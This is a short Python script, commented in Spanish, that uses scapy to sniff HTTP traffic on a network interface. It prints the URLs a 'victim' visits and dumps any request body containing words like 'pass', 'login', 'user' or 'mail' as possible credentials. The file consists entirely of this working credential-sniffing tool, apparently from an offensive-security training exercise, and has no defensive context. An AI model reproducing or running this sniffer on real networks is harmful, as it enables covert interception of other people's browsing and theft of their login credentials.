#!/usr/bin/env python3

import scapy.all as scapy
import signal
import sys
from scapy.layers import http
from termcolor import colored


def def_handler(sig,frame): # Creamos una función donde gestionaremos la lógica al pulsar Ctrl+C
  print(colored(f"\n[!] Saliendo...\n", 'red'))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def process_packet(packet): # Creamos una función donde gestionaremos la lógica al recibir los paquetes
  cred_keywords=["pass", "login","user","mail"] # Creamos una lista con las palabras clave

  if packet.haslayer(http.HTTPRequest): # Filtramos por paquetes HTTP
    url= "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode() # Creamos una variable con la url visitada
    print(colored(f"[+] URL viistada por la víctima: {url}", 'blue'))

    if packet.haslayer(scapy.Raw): # Filtramos por la capa RAW
      try:
        response=packet[scapy.Raw].load.decode() # Guardamos el contenido load de la capa RAW en una variable
        for keyword in cred_keywords: # Iteramos por cada elemento de la lista cred_keywords
          if keyword in response: # Si coincide con alguna palabra clave
            print(colored(f"\n[+] Posibles credenciales: {response}","green"))
            break
      except:
        pass


def sniff(interface):
  scapy.sniff(iface=interface, prn=process_packet, store=0)


def main():
  sniff("ens33")


if __name__ == '__main__':
  main()
